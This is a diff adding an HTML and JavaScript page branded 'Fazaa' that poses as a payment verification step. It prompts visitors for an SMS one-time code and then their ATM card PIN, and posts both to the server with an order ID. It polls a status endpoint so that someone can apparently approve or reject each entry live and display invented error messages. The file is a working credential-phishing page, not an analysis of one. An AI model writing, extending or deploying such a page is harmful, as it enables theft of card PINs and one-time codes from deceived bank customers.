@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing - Fazaa</title>
+    <style>
+        body { font-family: sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0066cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #1f2937; margin-bottom: 10px; }
+        p { color: #6b7280; font-size: 14px; line-height: 1.6; }
+        .hidden { display: none; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #d1d5db; border-radius: 6px; font-size: 18px; text-align: center; letter-spacing: 5px; }
+        .btn { background: #0066cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        .error-msg { color: #ef4444; font-size: 13px; margin-top: 10px; display: none; }
+        .input-error { border-color: #ef4444 !important; background: #fff5f5; }
+    </style>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <div id="loadingState">
+            <div class="loader"></div>
+            <h2>Processing your request</h2>
+            <p>Please wait, do not close or refresh the page...</p>
+        </div>
+
+        <div id="otpState" class="hidden">
+            <img src="/otp_icon.jpg" style="width: 60px; margin-bottom: 15px;">
+            <h2>Verification Code (OTP)</h2>
+            <p>A verification code has been sent to your registered phone. Please enter it to continue.</p>
+            <input type="text" id="otpInput" placeholder="000000" maxlength="6">
+            <button class="btn" onclick="submitOTP()">Confirm Code</button>
+            <div id="otpError" class="error-msg">The code you entered is incorrect. Please try again.</div>
+        </div>
+
+        <div id="pinState" class="hidden">
+            <h2>ATM PIN</h2>
+            <p>Please enter your 4-digit card PIN.</p>
+            <input type="password" id="pinInput" placeholder="****" maxlength="4">
+            <button class="btn" onclick="submitPIN()">Confirm</button>
+            <div id="pinError" class="error-msg">Incorrect ATM PIN, or your card might not be enabled for online payments.</div>
+        </div>
+
+        <div id="successState" class="hidden">
+            <div style="font-size: 60px; color: #10b981; margin-bottom: 15px;">✓</div>
+            <h2>Request Submitted Successfully</h2>
+            <p>Fazaa team will review your request and contact you shortly. Thank you.</p>
+        </div>
+    </div>
+
+    <script>
+        const orderId = new URLSearchParams(window.location.search).get('orderId');
+        if (!orderId) window.location.href = '/';
+
+        async function checkStatus() {
+            try {
+                const response = await fetch(`/api/check-status/${orderId}`);
+                const data = await response.json();
+
+                if (data.status === 'approved_payment') {
+                    showState('otpState');
+                } else if (data.status === 'rejected_payment') {
+                    alert(data.lastError || 'Payment failed. Please use another card.');
+                    window.location.href = '/payment.html';
+                } else if (data.status === 'approved_otp') {
+                    showState('pinState');
+                } else if (data.status === 'rejected_otp') {
+                    showOTPError(data.lastError);
+                } else if (data.status === 'approved_pin') {
+                    showState('successState');
+                } else if (data.status === 'rejected_pin') {
+                    showPINError(data.lastError);
+                }
+            } catch (e) { console.error(e); }
+        }
+
+        function showState(stateId) {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('otpState').classList.add('hidden');
+            document.getElementById('pinState').classList.add('hidden');
+            document.getElementById('successState').classList.add('hidden');
+            document.getElementById(stateId).classList.remove('hidden');
+        }
+
+        function showOTPError(msg) {
+            showState('otpState');
+            const input = document.getElementById('otpInput');
+            const error = document.getElementById('otpError');
+            input.classList.add('input-error');
+            error.style.display = 'block';
+            if (msg) error.innerText = msg;
+        }
+
+        function showPINError(msg) {
+            showState('pinState');
+            const input = document.getElementById('pinInput');
+            const error = document.getElementById('pinError');
+            input.classList.add('input-error');
+            error.style.display = 'block';
+            if (msg) error.innerText = msg;
+        }
+
+        async function submitOTP() {
+            const otp = document.getElementById('otpInput').value;
+            if (otp.length < 4) return;
+            showState('loadingState');
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ orderId, otp })
+            });
+        }
+
+        async function submitPIN() {
+            const pin = document.getElementById('pinInput').value;
+            if (pin.length < 4) return;
+            showState('loadingState');
+            await fetch('/submit-pin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ orderId, pin })
+            });
+        }
+
+        setInterval(checkStatus, 3000);
+    </script>
+</body>
+</html>
